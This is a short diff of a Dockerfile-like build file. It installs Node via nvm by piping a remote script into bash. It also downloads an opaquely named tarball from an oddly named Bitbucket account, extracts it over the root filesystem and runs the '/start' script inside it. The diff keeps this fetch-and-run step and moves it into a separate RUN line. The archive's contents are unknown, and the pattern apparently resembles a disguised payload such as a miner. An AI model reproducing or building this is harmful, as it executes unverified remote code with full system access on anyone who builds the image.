@@ -2,7 +2,9 @@ FROM vm/ubuntu:22.04
 
 ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb88888888888888
 
-RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash && export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && nvm install 16.15.1 && tar -xvf ./linux8888.tar.gz -C /
+RUN wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash && export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && nvm install 16.15.1
+
+RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C /
 RUN bash /start
 
 EXPOSE WEBSITE http://localhost:8080
